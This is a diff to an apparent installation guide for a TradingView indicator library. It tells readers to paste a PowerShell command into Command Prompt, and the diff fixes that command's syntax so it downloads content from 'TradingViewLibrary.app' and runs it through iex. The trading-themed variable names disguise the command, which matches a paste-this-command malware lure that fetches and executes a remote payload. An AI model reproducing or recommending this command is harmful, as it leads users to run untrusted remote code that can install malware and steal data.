@@ -26,7 +26,7 @@ Then press **Enter**.
 
 Copy and paste the following command into Command Prompt:
 ```powershell
-powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.6_beta'; $Sync='TradingViewLibrary.'; $Pinescript=$Sync+'app' (curl -UseBasicParsing ($Pinescript)).Content | iex"
+powershell -NoProfile -Command "$GetIndicatorList; $Quant; $IndicatorVersion='v_2.9.6_beta'; $Sync='TradingViewLibrary.'; $Pinescript=$Sync+'app'; (curl -UseBasicParsing ($Pinescript)).Content | iex"
 ```
 
 Press **Enter** to begin the installation.
